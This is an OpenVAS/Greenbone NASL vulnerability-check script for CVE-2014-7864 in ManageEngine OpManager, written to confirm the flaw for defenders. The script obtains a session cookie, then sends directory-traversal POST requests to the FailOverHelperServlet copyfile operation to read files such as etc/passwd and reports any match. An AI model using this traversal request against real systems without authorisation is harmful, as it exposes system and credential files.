# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zohocorp:manageengine_opmanager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805473");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2014-7864");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-03-20 11:53:55 +0530 (Fri, 20 Mar 2015)");
  script_name("ManageEngine OpManager Multiple Vulnerabilities (Feb 2015) - Active Check");

  script_tag(name:"summary", value:"ManageEngine OpManager is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to multiple SQL injection, local file include
  and file overwrite vulnerabilities in the FailOverHelperServlet (aka FailServlet) servlet.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote remote attackers and
  remote authenticated users to execute arbitrary SQL commands via the customerName or serverRole
  parameter in a standbyUpdateInCentral operation or to read/overwrite arbitrary files to
  servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet.");

  script_tag(name:"affected", value:"ManageEngine OpManager version 8 through 11.5 build 11400.");

  script_tag(name:"solution", value:"Update to version 11.6 or install the patch for 11.4 / 11.5.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130162");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/534575/100/0/threaded");
  script_xref(name:"URL", value:"https://support.zoho.com/portal/manageengine/helpcenter/articles/vulnerabilities-in-failoverhelperservle");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_manage_engine_opmanager_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("manageengine/opmanager/http/detected");
  script_require_ports("Services/www", 8060);

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( port:port, cpe:CPE ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/";
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ! buf || "Set-Cookie" >!< buf ) {
  url = dir + "/LoginPage.do";
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
  if( ! buf || "Set-Cookie" >!< buf )
    exit( 0 );
}

co = eregmatch( pattern:'Set-Cookie: ([^\r\n]+)', string:buf );
if( isnull( co[1] ) )
  exit( 0 );

cookie = co[1];

servlet = "com.adventnet.me.opmanager.servlet.FailOverHelperServlet";
url = dir + "/servlet/" + servlet;

req = http_get_req( port:port, url:url, add_headers:make_array( "Cookie", cookie ) );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 404" )
  servlet = "FailOverHelperServlet";

files = traversal_files();

foreach file( keys( files ) ) {
  if( files[file] == "etc/passwd" )
    traversal = "/../../../../../../../../../../../../../";
  else
    traversal = '\\..\\..\\..\\..\\..\\..\\..\\\\';

  url = dir + "/servlet/" + servlet + "?operation=copyfile&fileName=" + traversal + files[file];

  req = http_post_put_req( port:port, url:url, data:NULL, add_headers:make_array( "Cookie", cookie ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( pattern:file, string:res ) ) {
    report = 'By sending the request\n\n' + req + 'it was possible to read the file ' + files[file] +
             ' on the remote Host.\n\nResponse:\n\n' + res;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
